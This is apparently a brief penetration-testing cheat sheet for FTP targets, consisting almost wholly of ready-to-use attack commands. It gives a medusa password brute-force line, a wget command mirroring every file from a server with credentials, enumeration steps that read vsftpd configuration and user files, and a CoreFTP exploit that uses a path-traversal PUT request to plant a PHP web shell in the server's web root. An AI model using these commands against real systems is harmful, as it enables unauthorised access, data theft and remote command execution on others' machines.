###### Get all files
```
wget -m --no-passive ftp://<USER>:<PASS>@<IP>
```
###### Login Bruteforce
```
medusa -u <USER> -P <WORDLIST> -h <IP> -M ftp
```
###### Enumeration
```
status
debug
trace
ls -R 

cat /etc/vsftpd.conf
cat /etc/ftpusers
```
###### CoreFTP Exploit
```
curl -k -X PUT -H "Host: <IP>" --basic -u <USER>:<PASS> --data-binary "<?php echo shell_exec($_GET["c"]);?>" --path-as-is https://<IP>/../../../../../../xampp/htdocs/shell.php
```